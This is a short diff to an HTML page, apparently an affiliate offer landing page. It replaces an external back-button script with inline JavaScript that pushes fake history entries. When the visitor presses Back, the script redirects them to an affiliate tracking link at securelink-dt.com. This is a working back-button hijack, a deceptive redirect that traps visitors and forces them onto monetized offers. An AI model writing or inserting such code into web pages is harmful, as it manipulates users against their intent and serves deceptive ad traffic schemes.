@@ -187,7 +187,20 @@ content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=
         </script>
     </div>
     <script type="text/javascript" src="./assets/js/second-offer.js"></script>
-    <script type="text/javascript" src="./assets/js/back-button.js"></script>
+    <script>
+      var bbURL = "https://securelink-dt.com/?a=239394&o=92153&c=0&co=297426&mt=7";
+      ! function() {
+      var a;
+      try {
+      for (a = 0; 3 > a; ++a) {
+      history.pushState({}, "", "#")
+      }
+      onpopstate = function(c) {
+      c.state && location.replace(bbURL)
+      }
+      } catch (b) {}
+      }();
+      </script>
 </body>
 
 </html>
